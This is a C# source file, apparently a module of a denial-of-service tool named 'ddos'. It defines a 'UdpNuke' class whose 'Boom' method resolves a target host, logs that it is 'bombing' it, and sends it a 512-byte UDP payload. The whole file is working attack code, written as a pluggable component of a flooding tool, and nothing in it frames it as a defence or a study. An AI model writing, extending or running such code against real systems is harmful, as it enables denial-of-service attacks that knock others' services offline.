using ddos.Interfaces;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.Silo
{
    public class UdpNuke : BaseNuke
    {
        private readonly ITools _tools;
        public UdpNuke(ITools tools,ILogger<UdpNuke> logger, IServiceProvider serviceProvider, IAppArgs appArgs) : base(logger, serviceProvider, appArgs)
        {
            _tools = tools ?? throw new ArgumentNullException(nameof(tools));
        }        

        public override async Task Boom(string destination, bool useProxy, CancellationToken cancellationToken)
        {
            if (string.IsNullOrWhiteSpace(destination))
                return;

            Logger.LogInformation($"Udp...");
            Logger.LogInformation($"Bombing {destination}");

            cancellationToken.ThrowIfCancellationRequested();
            
            try
            {
                var ip = await _tools.GetIP(destination) ?? throw new Exception($"IP for {destination} can not resolved.");
                Logger.LogInformation($"IP is {ip}");
                using (var client = new UdpClient())
                {
                    client.Connect(ip);

                    cancellationToken.ThrowIfCancellationRequested();

                    var load = await _tools.CreateLoad(512);
                    client.AllowNatTraversal(true);
                    client.DontFragment = true;

                    await client.SendAsync(load, load.Length);

                    cancellationToken.ThrowIfCancellationRequested();
                }

            }
            catch(Exception ex)
            {
                Logger.LogError(ex.Message, ex);
            }
        }

        public override string WhoAmI()
        {
            return "Udp";
        }
    }
}
